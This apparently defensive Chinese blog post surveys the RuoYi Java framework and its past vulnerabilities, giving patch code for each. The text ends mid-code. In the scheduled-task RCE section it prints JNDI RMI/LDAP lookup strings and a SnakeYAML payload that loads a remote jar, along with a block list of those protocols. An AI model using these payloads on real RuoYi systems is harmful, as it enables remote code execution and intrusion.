<div class="article_content clearfix" id="article_content">
<link href="style.css" rel="stylesheet"/>
<div class="markdown_views prism-atom-one-dark" id="content_views">
<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
</svg>
<h1><a id="Ruo_Yi_0"></a>若依-Ruo Yi（分离版）</h1>
<h2><a id="_2"></a>一、了解框架</h2>
<hr/>
<h3><a id="1_8"></a>1、简介（什么是若依）</h3>
<p>​ RuoYi 是一款基于<strong>SpringBoot + Bootstrap</strong> 的快速开发框架。</p>
<ul><li> <p>RuoYi 官网地址：<a href="http://ruoyi.vip/">http://ruoyi.vip(opens new window)</a></p> </li><li> <p>RuoYi 在线文档：<a href="http://doc.ruoyi.vip/">http://doc.ruoyi.vip(opens new window)</a></p> </li><li> <p>RuoYi 源码下载：<a href="https://gitee.com/y_project/RuoYi">https://gitee.com/y_project/RuoYi(opens new window)</a></p> <p>RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。</p> </li></ul>
<h3><a id="2_22"></a>2、主要特点</h3>
<ul><li>完全响应式布局（支持电脑、平板、手机等所有主流设备）</li><li>强大的一键生成功能（包括控制器、模型、视图、菜单等）</li><li>支持多数据源，简单配置即可实现切换。</li><li>支持按钮及数据权限，可自定义部门数据权限。</li><li>对常用js插件进行二次封装，使js代码变得简洁，更加易维护</li><li>完善的XSS防范及脚本过滤，彻底杜绝XSS攻击</li><li>Maven多项目依赖，模块及插件分项目，尽量松耦合，方便模块升级、增减模块。</li><li>国际化支持，服务端及客户端支持</li><li>完善的日志记录体系简单注解即可实现</li><li>支持服务监控，数据监控，缓存监控功能。</li></ul>
<h3><a id="3_35"></a>3、所用技术</h3>
<hr/>
<p><strong>3.1、系统环境</strong></p>
<ul><li>Java EE 8</li><li>Servlet 3.0</li><li>Apache Maven 3</li></ul>
<p><strong>3.2、主框架</strong></p>
<ul><li>Spring Boot 2.2.x</li><li>Spring Framework 5.2.x</li><li>Apache Shiro 1.7</li></ul>
<p><strong>3.3、持久层</strong></p>
<ul><li>Apache MyBatis 3.5.x</li><li>Hibernate Validation 6.0.x</li><li>Alibaba Druid 1.2.x</li></ul>
<p><strong>3.4、视图层</strong></p>
<ul><li>Bootstrap 3.3.7</li><li>Thymeleaf 3.0.x</li></ul>
<hr/>
<h3><a id="4_66"></a>4、历史漏洞</h3>
<ul><li>存在系统安全漏洞 <code>RuoYi &lt;= v4.7.1</code></li></ul>
<p>在<code>&lt;= thymeleaf-spring5:3.0.12</code>组件中，<code>thymeleaf</code>结合模板注入中的特定场景可能会导致远程代码执行。详细描述参见 <a href="https://github.com/thymeleaf/thymeleaf-spring/issues/256">https://github.com/thymeleaf/thymeleaf-spring/issues/256(opens new window)</a></p>
<p>添加代码到<code>pom.xml</code>依赖升级处理，防止远程代码执行漏洞。</p>
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thymeleaf.version</span><span class="token punctuation">&gt;</span></span>3.0.14.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thymeleaf.version</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- thymeleaf模板引擎和spring框架的整合 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>thymeleaf-spring5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${thymeleaf.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${thymeleaf.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>在<code>&lt;= log4j2:2.17.0</code>组件中，<code>log4j2</code>存在远程代码执行和不受控制的递归漏洞。详细描述参见 <a href="https://gitee.com/y_project/RuoYi/issues/I4LW93">https://gitee.com/y_project/RuoYi/issues/I4LW93(opens new window)</a></p>
<p>添加代码到<code>pom.xml</code>依赖升级处理，防止远程代码执行和不受控制的递归漏洞。</p>
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>log4j2.version</span><span class="token punctuation">&gt;</span></span>2.17.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>log4j2.version</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- log4j日志组件 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${log4j2.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-to-slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${log4j2.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>在用户管理页面，导入用户<code>xlsx</code>数据内容存在被<code>XSS</code>注入的风险，需要在提交时进行数据内容校验。完整代码提交。<a href="https://gitee.com/y_project/RuoYi/commit/5587d39d42b9d642ed44acc56e2d7bc3adf3a037">自定义xss校验注解实现，防止用户导入Xss风险漏洞(opens new window)</a></p>
<p>找到<code>SysUser.java</code>类，然后实体类新增<code>@Xss</code>注解进行校验（关键代码）</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Xss</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"登录账号不能包含脚本字符"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLoginName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> loginName<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@Xss</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"用户昵称不能包含脚本字符"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> userName<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>找到<code>SysUserServiceImpl.java</code>类，然后修改导入用户数据方法，增加实体类校验（关键代码）</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Autowired</span>
<span class="token keyword">protected</span> <span class="token class-name">Validator</span> validator<span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNull</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token class-name">BeanValidators</span><span class="token punctuation">.</span><span class="token function">validateWithException</span><span class="token punctuation">(</span>validator<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>isUpdateSupport<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token class-name">BeanValidators</span><span class="token punctuation">.</span><span class="token function">validateWithException</span><span class="token punctuation">(</span>validator<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre>
<p>在代码生成页面，创建表功能存在<code>SQL</code>注入漏洞风险（这个功能只有admin用户才能操作），可以在创建表时填入一些SQL注入代码，需要在创建前进行语法校验。完整代码提交。<a href="https://gitee.com/y_project/RuoYi/commit/452da5caebf52b0e690a634f47cc7e538155ec24">代码生成创建表检查关键字，防止注入风险(opens new window)</a></p>
<p>找到<code>GenController.java</code>类，然后修改创建表方法。增加<code>SQL</code>关键字校验（关键代码）</p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">try</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token class-name">SqlUtil</span><span class="token punctuation">.</span><span class="token function">filterKeyword</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
		<span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"创建表结构异常["</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>解决方案：上述漏洞可以升级<code>RuoYi</code>版本到<code>4.7.2</code>，或按示例进行操作，防止出现系统安全漏洞。</p>
<ul><li>存在远程执行漏洞 <code>RuoYi &lt;= v4.6.2</code></li></ul>
<p>漏洞详细：</p>
<p>定时任务存在反序列化漏洞利用点，可以通过发送<code>rmi</code>、<code>http</code>、<code>ldap</code>请求，完成命令执行攻击。</p>
<p>如目标字符串具体内容<code>rmi</code>：<code>org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')</code></p>
<p>如目标字符串具体内容<code>ldap(s)</code>：<code>javax.naming.InitialContext.lookup('ldap://127.0.0.1:9999/#Exploit')</code></p>
<p>如目标字符串具体内容<code>http(s)</code>：<code>org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/poc/yaml-payload.jar"]]]]')</code></p>
<p>新增/修改定时任务<code>SysJobController.java</code>示例代码（屏蔽<code>rmi</code>、<code>ldap</code>、<code>http(s)</code>目标字符串）</p>
<pre><code class="prism language-java"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">containsIgnoreCase</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>LOOKUP_RMI<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"新增任务'"</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'失败，目标字符串不允许'rmi'调用"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">containsAnyIgnoreCase</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>LOOKUP_LDAP<span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>LOOKUP_LDAPS <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"新增任务'"</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'失败，目标字符串不允许'ldap(s)'调用"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">containsAnyIgnoreCase</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>HTTP<span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>HTTPS <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"新增任务'"</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'失败，目标字符串不允许'http(s)'调用"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">containsAnyIgnoreCase</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>JOB_ERROR_STR<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"新增任务'"</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'失败，目标字符串存在违规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">ScheduleUtils</span><span class="token punctuation">.</span><span class="token function">whiteList</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"新增任务'"</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'失败，目标字符串不在白名单内"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>解决方案：升级<code>RuoYi</code>版本到 <code>&gt; 4.6.2</code>，或者添加示例代码处理，防止注入漏洞。</p>
<ul><li>存在SQL注入漏洞 <code>RuoYi &lt;= v4.6.1</code></li></ul>
<p><code>Mybatis</code>配置中使用了<code>$</code>所以会存在<code>sql</code>注入漏洞。</p>
<p>漏洞详细：</p>
<p>1、<code>SysDeptMapper.xml</code>中的<code>updateParentDeptStatus</code>节点使用了<code>${ancestors}</code>，修改相关逻辑。转成数组方式修改部门状态。</p>
<pre><code class="prism language-java"><span class="token comment">/**
 * 修改该部门的父级部门状态
 * 
 * @param dept 当前部门
 */</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">updateParentDeptStatusNormal</span><span class="token punctuation">(</span><span class="token class-name">Dept</span> dept<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">String</span> ancestors <span class="token operator">=</span> dept<span class="token punctuation">.</span><span class="token function">getAncestors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">Long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> deptIds <span class="token operator">=</span> <span class="token class-name">Convert</span><span class="token punctuation">.</span><span class="token function">toLongArray</span><span class="token punctuation">(</span>ancestors<span class="token punctuation">)</span><span class="token punctuation">;</span>
	deptMapper<span class="token punctuation">.</span><span class="token function">updateDeptStatusNormal</span><span class="token punctuation">(</span>deptIds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、数据权限相关使用了<code>${params.dataScope}</code>，<code>DataScopeAspect.java</code>数据过滤处理时添加<code>clearDataScope</code>拼接权限<code>sql</code>前先清空<code>params.dataScope</code>参数防止注入。</p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DataScopeAspect</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">"dataScopePointCut()"</span><span class="token punctuation">)</span>
	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doBefore</span><span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> point<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">clearDataScope</span><span class="token punctuation">(</span>point<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">handleDataScope</span><span class="token punctuation">(</span>point<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">clearDataScope</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">JoinPoint</span> joinPoint<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token class-name">Object</span> params <span class="token operator">=</span> joinPoint<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> params <span class="token keyword">instanceof</span> <span class="token class-name">BaseEntity</span><span class="token punctuation">)</span>
		<span class="token punctuation">{<!-- --></span>
			<span class="token class-name">BaseEntity</span> baseEntity <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BaseEntity</span><span class="token punctuation">)</span> params<span class="token punctuation">;</span>
			baseEntity<span class="token punctuation">.</span><span class="token function">getParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>DATA_SCOPE<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre>
<p>解决方案：升级<code>RuoYi</code>版本到 <code>&gt;=4.6.2</code>，或者添加示例代码处理，防止注入漏洞。</p>
<ul><li>任意文件下载漏洞 <code>RuoYi &lt;= v4.5.0</code></li></ul>
<p>任意文件下载漏洞，正常的利用手段是下载服务器文件，如脚本代码，服务器配置或者是系统配置等等。可以利用<code>../</code>来逐层猜测路径。</p>
<p>网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</p>
<p>检测漏洞：<code>CommonController.java</code>，<code>/common/download/resource</code>接口是否包含<code>checkAllowDownload</code>用于检查文件是否可下载，如果没有此方法则需要修改，防止被下载关键信息。</p>
<p>解决方案：升级<code>RuoYi</code>版本到 <code>&gt;=4.5.1</code>，或者重新添加文件下载检查，防止任意文件下载。</p>
<pre><code class="prism language-java"><span class="token comment">/**
 * 本地资源通用下载
 */</span>
<span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/common/download/resource"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">resourceDownload</span><span class="token punctuation">(</span><span class="token class-name">String</span> resource<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span>
		<span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">try</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">checkAllowDownload</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{<!-- --></span>
			<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"资源文件({})非法，不允许下载。 "</span><span class="token punctuation">,</span> resource<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token comment">// 本地资源路径</span>
		<span class="token class-name">String</span> localPath <span class="token operator">=</span> <span class="token class-name">Global</span><span class="token punctuation">.</span><span class="token function">getProfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 数据库资源地址</span>
